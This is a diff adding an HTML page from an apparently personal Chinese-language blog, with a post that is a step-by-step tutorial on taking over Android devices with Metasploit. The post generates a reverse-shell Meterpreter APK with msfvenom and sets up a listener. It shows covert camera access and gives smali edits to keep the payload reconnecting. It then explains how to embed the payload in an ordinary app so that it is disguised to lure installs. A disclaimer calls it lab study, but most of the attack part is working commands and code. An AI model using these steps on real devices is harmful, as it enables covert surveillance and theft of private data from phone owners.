@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Android," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。 写在前面的感想：做这个实验的时候，才发现一直以为的“手机不root就很安全”实在是太天真了。 有心人想窃取个人隐私简直轻而易举，需要了解攻击者的手法，不断提高防御水平，才能“知己知彼，百战不殆”。 维护信息安全，人人有责。 一、生成payload程序kali ip为：172.16.20">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf操作Android设备实验-copy">
+<meta property="og:url" content="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/index.html">
+<meta property="og:site_name" content="clicker&#39;s blogs">
+<meta property="og:description" content="郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。 写在前面的感想：做这个实验的时候，才发现一直以为的“手机不root就很安全”实在是太天真了。 有心人想窃取个人隐私简直轻而易举，需要了解攻击者的手法，不断提高防御水平，才能“知己知彼，百战不殆”。 维护信息安全，人人有责。 一、生成payload程序kali ip为：172.16.20">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/apk.PNG">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/%E6%8D%95%E8%8E%B7.PNG">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5.PNG">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/%E6%9F%A5%E7%9C%8B%E8%AE%BE%E5%A4%87%E4%BF%A1%E6%81%AF.PNG">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/%E6%89%93%E5%BC%80%E6%91%84%E5%83%8F%E5%A4%B4.PNG">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/webcam.PNG">
+<meta property="article:published_time" content="2020-03-26T07:37:01.000Z">
+<meta property="article:modified_time" content="2020-03-26T07:56:20.260Z">
+<meta property="article:author" content="clicker">
+<meta property="article:tag" content="Android">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/apk.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/26/msf操作Android设备实验-copy/"/>
+
+
+
+
+
+  <title>msf操作Android设备实验-copy | clicker's blogs</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">clicker's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/26/msf%E6%93%8D%E4%BD%9CAndroid%E8%AE%BE%E5%A4%87%E5%AE%9E%E9%AA%8C-copy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="clicker">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="clicker's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">msf操作Android设备实验-copy</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-26T15:37:01+08:00">
+                2020-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">工具配置笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong><em>郑重声明：本文展示的过程是在模拟环境中进行的，只为学习研究之用，如有人用于非法用途，产生的后果笔者不负任何责任。</em></strong></p>
+<p><strong>写在前面的感想：</strong>做这个实验的时候，才发现一直以为的“手机不root就很安全”实在是太天真了。 有心人想窃取个人隐私简直轻而易举，需要了解攻击者的手法，不断提高防御水平，才能“知己知彼，百战不殆”。</p>
+<p><strong>维护信息安全，人人有责。</strong></p>
+<h2 id="一、生成payload程序"><a href="#一、生成payload程序" class="headerlink" title="一、生成payload程序"></a>一、生成payload程序</h2><p>kali ip为：<em>172.16.20.98</em>； Android设备ip为：<em>172.16.20.81</em>。打开kali终端，执行以下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.20.98 lport&#x3D;4444 R &gt; &#x2F;opt&#x2F;apk.apk</span><br></pre></td></tr></table></figure>
+
+<p>命令中的lhost是kali的ip，lport指定一个端口。</p>
+<p><img src="apk.PNG" alt=""></p>
+<p>将生成的apk文件安装至Android设备中备用。 安装成功后桌面会多一个名字为MainActivity的应用图标。</p>
+<h2 id="二、连接Android设备"><a href="#二、连接Android设备" class="headerlink" title="二、连接Android设备"></a>二、连接Android设备</h2><p>执行以下步骤：</p>
+<ol>
+<li>在kali终端输入<code>msfconsole</code>，进入msf环境</li>
+<li>启动监听模块：<code>use exploit/multi/handler</code></li>
+<li>设置payload：<code>set payload android/meterpreter/reverse_tcp</code></li>
+<li>设置LHOST: <code>set lhost 172.16.20.98</code></li>
+<li>设置LPORT：<code>set lport 4444</code></li>
+<li>最后执行：<code>exploit</code></li>
+</ol>
+<p><img src="%E6%8D%95%E8%8E%B7.PNG" alt=""></p>
+<p>点击MainActivity图标（点击之后桌面没有反应，是正常的），可以在kali终端看到连接已经建立：</p>
+<p><img src="%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5.PNG" alt=""></p>
+<p><strong>功能：</strong>可以输入<code>help</code>命令查看有哪些操作，这里仅举一些例子，如查看设备信息、是否root、在设备上毫无异常的情况下打开摄像头等等</p>
+<p><img src="%E6%9F%A5%E7%9C%8B%E8%AE%BE%E5%A4%87%E4%BF%A1%E6%81%AF.PNG" alt=""></p>
+<p><img src="%E6%89%93%E5%BC%80%E6%91%84%E5%83%8F%E5%A4%B4.PNG" alt=""></p>
+<p><img src="webcam.PNG" alt=""></p>
+<p>但是，这个连接是在APP启动的时候建立的，稳定性比较差，一旦断网就会断开连接，且不会自动重连。</p>
+<h2 id="二、稳定性增强版"><a href="#二、稳定性增强版" class="headerlink" title="二、稳定性增强版"></a>二、稳定性增强版</h2><p>目前，解决稳定性问题最普遍的方法是，在建立连接后，迅速将以下脚本复制到Android设备上，并执行：</p>
+<p><code>#!/bin/bash</code><br><strong><code>while</code></strong><code>true</code><br><strong><code>do</code></strong><code>am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity</code><br><code>sleep 20</code><br><strong><code>done</code></strong></p>
+<p>即定时重启Payload应用程序。但是，在没有root的设备上执行脚本会有权限错误。。。。因此，考虑修改Payload应用程序的源码。</p>
+<p>反编译该apk文件，得到启动payload的关键代码：</p>
+<p><em>MainActivity.java:</em><br><code>protected void onCreate(Bundle arg1) {super.onCreate(arg1);MainService.startService(((Context)this));this.finish();}</code></p>
+<p><em>MainService.java:</em><br><code>public int onStartCommand(Intent arg2, int arg3, int arg4) {Payload.start(((Context)this));return 1;}</code></p>
+<p>可以看到在MainService类的onStartCommand方法中启动了Payload。</p>
+<p>思路一是重写MainService的onDestroy方法，在这个方法中加入启动Payload的代码。但是，payload连接断开时，MainService服务并没有结束，不会调用onDestroy方法，这里行不通。</p>
+<p>思路二是通过在onStartCommand方法中添加AlarmManager定时器，定时执行payload，保证payload一直连接。即将onStartCommand方法修改为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public int onStartCommand(Intent intent, int flags, int startId) &#123; Payload.start(this); </span><br><span class="line">AlarmManager manager &#x3D; (AlarmManager) getSystemService(ALARM_SERVICE); </span><br><span class="line">int restarttime &#x3D; 60 * 1000; &#x2F;&#x2F; one minute </span><br><span class="line">long triggerAtTime &#x3D; SystemClock.elapsedRealtime() + restarttime; </span><br><span class="line">Intent i &#x3D; new Intent(&quot;METASPLOIT&quot;); </span><br><span class="line">PendingIntent pi &#x3D; PendingIntent.getBroadcast(this, 0, i, 0); manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi); </span><br><span class="line">return START_STICKY; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的修改反编译的smali代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.method public onStartCommand(Landroid&#x2F;content&#x2F;Intent;II)I .locals 7 invoke-static &#123;p0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;Payload;-&gt;start(Landroid&#x2F;content&#x2F;Context;)V const-string v0, &quot;alarm&quot; </span><br><span class="line">invoke-virtual &#123;p0, v0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;getSystemService(Ljava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;Object; </span><br><span class="line">move-result-object v0 </span><br><span class="line">check-cast v0, Landroid&#x2F;app&#x2F;AlarmManager; </span><br><span class="line">.local v0, </span><br><span class="line">&quot;manager&quot;:Landroid&#x2F;app&#x2F;AlarmManager;</span><br><span class="line">const v1, 0xea60 </span><br><span class="line">.local v1, &quot;restarttime&quot;:I </span><br><span class="line">invoke-static &#123;&#125;, Landroid&#x2F;os&#x2F;SystemClock;-&gt;elapsedRealtime()J </span><br><span class="line">move-result-wide v2 </span><br><span class="line">int-to-long v4, v1 </span><br><span class="line">add-long&#x2F;2addr v2, v4 </span><br><span class="line">.local v2, &quot;triggerAtTime&quot;:J </span><br><span class="line">new-instance v4, Landroid&#x2F;content&#x2F;Intent; </span><br><span class="line">const-string v5, &quot;METASPLOIT&quot; </span><br><span class="line">invoke-direct &#123;v4, v5&#125;, Landroid&#x2F;content&#x2F;Intent;-&gt;&lt;init&gt;(Ljava&#x2F;lang&#x2F;String;)V .local v4, &quot;i&quot;:Landroid&#x2F;content&#x2F;Intent; </span><br><span class="line">const&#x2F;4 v5, 0x0 </span><br><span class="line">invoke-static &#123;p0, v5, v4, v5&#125;, Landroid&#x2F;app&#x2F;PendingIntent;-&gt;getBroadcast(Landroid&#x2F;content&#x2F;Context;ILandroid&#x2F;content&#x2F;Intent;I)Landroid&#x2F;app&#x2F;PendingIntent; </span><br><span class="line">move-result-object v5 </span><br><span class="line">.local v5, &quot;pi&quot;:Landroid&#x2F;app&#x2F;PendingIntent; </span><br><span class="line">const&#x2F;4 v6, 0x2 </span><br><span class="line">invoke-virtual &#123;v0, v6, v2, v3, v5&#125;, Landroid&#x2F;app&#x2F;AlarmManager;-&gt;set(IJLandroid&#x2F;app&#x2F;PendingIntent;)V </span><br><span class="line">const&#x2F;4 v6, 0x1 </span><br><span class="line">return v6</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
+
+<p>另外，需要修改MainBroadcastReceiver的onReceiver方法中的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void onReceive(Context context, Intent intent) &#123; MainService.startService(context); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的smali为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.method public onReceive(Landroid&#x2F;content&#x2F;Context;Landroid&#x2F;content&#x2F;Intent;)V .locals 0 </span><br><span class="line">invoke-static &#123;p1&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;startService(Landroid&#x2F;content&#x2F;Context;)V </span><br><span class="line">return-void</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
+
+<p>然后，在Manifext中的MainBroadcastReceiver模块的intent-filter中增加：<br><code>&lt;</code><strong><code>action</code></strong><code>android:name=&quot;METASPLOIT&quot; /&gt;</code></p>
+<p>smali修改完成后执行<code>apktool apk -o apk_unsigned.apk</code>，得到重新打包的payload apk；<br>然后执行<code>jarsigner -verbose -keystore demo.keystore -signedjar apk_signed.apk apk_unsigned.apk demo.keystore</code> 对应用进行签名（需要先生成KEYSTORE文件，并将此文件放在apk_unsigned.apk同一目录下）；<br>最后将签过名的apk_signed.apk安装至目标Android设备即可。</p>
+<p>结果：</p>
+<ol>
+<li>修改前和修改后的Payload应用程序均会被Android设备检测出风险，需要增加免杀；</li>
+<li>连接依然不稳定。。。。</li>
+</ol>
+<h2 id="三、隐蔽性增强版"><a href="#三、隐蔽性增强版" class="headerlink" title="三、隐蔽性增强版"></a>三、隐蔽性增强版</h2><p>一开始考虑修改Payload应用程序的应用名和图标，伪装成其他应用，诱导用户安装。但是，反编译payload apk文件后，发现资源目录下没有drawable目录，无法更换图标。。。。。</p>
+<p>只好换个思路，把payload应用程序嵌入某个普通app中。</p>
+<p>首先，反编译两个应用。</p>
+<ol>
+<li>打开将Payload应用程序 的smali目录复制到普通APP的相应目录下；</li>
+<li>打开普通APP的AndroidManifest.xml文件，将Payload应用程序 的Manifest中申请的权限复制过来；</li>
+<li>再把Payload应用程序 的Manifest中声名的组件复制到普通APP的Manifest文件中， 注意普通应用包名和 Payload应用程序 包名不同，复制过来后需要把组件名补全 ；</li>
+<li>在普通APP的Manifest中找到有如下intent-filter标签的Activity：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt; </span><br><span class="line"> &lt;action android:name&#x3D;&quot;android.intent.action.MAIN&quot; &#x2F;&gt;</span><br><span class="line"> &lt;category android:name&#x3D;&quot;android.intent.category.LAUNCHER&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;intent-filter&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>在smali目录中，打开上一步找到的Activity，找到onCreate方法，在第一行插入Payload服务的启动语句，如下：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.method protected onCreate(Landroid&#x2F;os&#x2F;Bundle;)V </span><br><span class="line">invoke-static &#123;p0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;MainService;-&gt;startService(Landroid&#x2F;content&#x2F;Context;)V </span><br><span class="line">.locals 6 </span><br><span class="line">.param p1, &quot;savedInstanceState&quot; </span><br><span class="line"># Landroid&#x2F;os&#x2F;Bundle;.............end method</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>重新打包、签名该应用。</li>
+</ol>
+<p>即可完成对 Payload应用程序 的伪装。但是，仍然会被设备检测出风险。</p>
+<p>参考文献：<br>【1】 <a href="https://www.freebuf.com/sectool/141234.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/141234.html</a><br>【2】 <a href="https://www.freebuf.com/articles/terminal/188585.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/terminal/188585.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Android/" rel="tag"># Android</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/26/%E5%A4%8D%E7%8E%B0CVE-2019-2025%E6%97%B6%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91-copy/" rel="next" title="复现CVE-2019-2025时踩过的坑-copy">
+                <i class="fa fa-chevron-left"></i> 复现CVE-2019-2025时踩过的坑-copy
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">clicker</p>
+              <p class="site-description motion-element" itemprop="description">灾难总是接踵而至，这正是世间的常理。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、生成payload程序"><span class="nav-number">1.</span> <span class="nav-text">一、生成payload程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、连接Android设备"><span class="nav-number">2.</span> <span class="nav-text">二、连接Android设备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、稳定性增强版"><span class="nav-number">3.</span> <span class="nav-text">二、稳定性增强版</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、隐蔽性增强版"><span class="nav-number">4.</span> <span class="nav-text">三、隐蔽性增强版</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">clicker</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
